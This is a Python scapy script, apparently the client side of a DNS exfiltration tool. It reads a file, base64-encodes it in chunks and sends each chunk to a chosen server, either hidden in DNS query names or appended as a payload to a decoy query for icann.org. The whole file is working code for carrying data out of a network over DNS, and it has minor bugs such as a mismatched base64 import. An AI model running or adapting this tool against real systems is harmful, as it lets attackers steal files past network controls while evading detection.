import argparse
import time
from base64 import b64encode
from scapy.all import *

# Why is this? Larger than this the b64 decode fails on other end, max lenght in DNS query issues?
MAX_SAFE_CHUNK_SIZE=45


def send_data_as_query(infile, dest, dest_port, chunk):
    pkt=IP(dst=dest)/UDP(dport=dest_port)/DNS()
    with open(infile, 'rb') as f:
        read = 0
        while 1:
            byte_s = f.read(chunk)
            read += len(byte_s)
            print("Read " + str(len(byte_s)) + " bytes, " + str(read) + " total.")
            byte_s = base64.b64encode(byte_s)
            if not byte_s:
                break
            pkt.qd=DNSQR(qname=byte_s)
            send(pkt)
           
def send_data_as_payload(infile, dest, dest_port, chunk):
    pkt=IP(dst=dest)/UDP(dport=dest_port)/DNS()
    pkt.qd=DNSQR(qname="icann.org")
    pkt = pkt/""
    with open(infile, 'rb') as f:
        read=0
        while 1:
            byte_s = f.read(chunk)
            read += len(byte_s)
            print("Read " + str(len(byte_s)) + " bytes, " + str(read) + " total.")
            byte_s = base64.b64encode(byte_s)
            if not byte_s:
                break
            pkt.payload.load=byte_s
            send(pkt)
 
def main():
    parser = argparse.ArgumentParser("client")
    parser.add_argument("--infile", "-i", help="Input file to send", 
            type=str, default="input.txt")
    parser.add_argument("--dest", "-d", help="IP address of DNS server to send to.", 
            type=str, default="127.0.0.1")
    parser.add_argument("--dest_port","-p", help="Destination port to send to.", 
            type=int, default=53)
    parser.add_argument("--chunk", "-c", help="Maximum number of bytes to send at once.", 
            type=int, default=32)
    parser.add_argument("--send-as", "-s", help="Send as query or payload.", 
            type=str, choices=["payload", "query"], default="query")
    args = parser.parse_args()
    
    if args.send_as == "query":
        chunk = min(args.chunk, MAX_SAFE_CHUNK_SIZE)
        send_data_as_query(args.infile, args.dest, args.dest_port, chunk)
    elif args.send_as == "payload":
        send_data_as_payload(args.infile, args.dest, args.dest_port, args.chunk)


if __name__== "__main__":
    main()
